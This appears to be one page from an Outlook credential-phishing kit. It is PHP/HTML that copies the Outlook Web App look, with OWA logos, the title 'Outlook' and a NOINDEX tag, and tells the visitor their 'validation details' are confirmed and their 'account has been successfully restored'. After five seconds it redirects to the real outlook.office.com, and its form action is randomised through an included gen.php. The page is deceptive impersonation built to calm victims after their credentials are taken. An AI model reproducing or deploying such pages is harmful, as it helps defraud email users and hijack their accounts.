<?php
    session_start();
    include('gen.php');
    $status = "";    
?>
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10" />
        <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8" />
        <meta name="Robots" content="NOINDEX, NOFOLLOW" />
        <title>Outlook</title>
        <link rel="stylesheet" href="./assets/css/style.css">
        <script>
            function Redirect() {
                window.location="https://outlook.office.com/";
            }

            setTimeout('Redirect()', 5000);
        </script>
    </head>
    <body class="signInBg">
        <form action="<?php echo generateRandomString(); ?>" method="POST" name="logonForm" id="loginForm" enctype="application/x-www-form-urlencoded" autocomplete="off">            
            <input type="hidden" name="LOB" value="EmailAddress" />    
            <div id="mainLogonDiv" class="mouse">
                <div class="sidebar">
                    <div class="owaLogoContainer">
                        <img src="./assets/images/owaLogo.png" class="owaLogo" aria-hidden="true" />
                        <img src="./assets/images/owaLogo_sm.png" class="owaLogoSmall" aria-hidden="true" />
                    </div>
                </div>
                <div class="logonContainer">
                    <div id="lgnDiv" class="logonDiv">
                        <div data-form-element="emailPrimary" class="mwf-field ">
                            <p class="header__content__subheading">You have successfully confirmed your validation details.</p>
                            <p class="header__content__subheading">Your Outlook account has been successfully restored.</p>
                            <p class="header__content__subheading">You would be re-directed to the homepage</p>
                            <br />
                        </div>
                    </div>
                </div>
            </div>
        </form>
        <script>
            function logIn() {
                document.getElementById("loginForm").submit();
            }
        </script>
    </body>
</html>
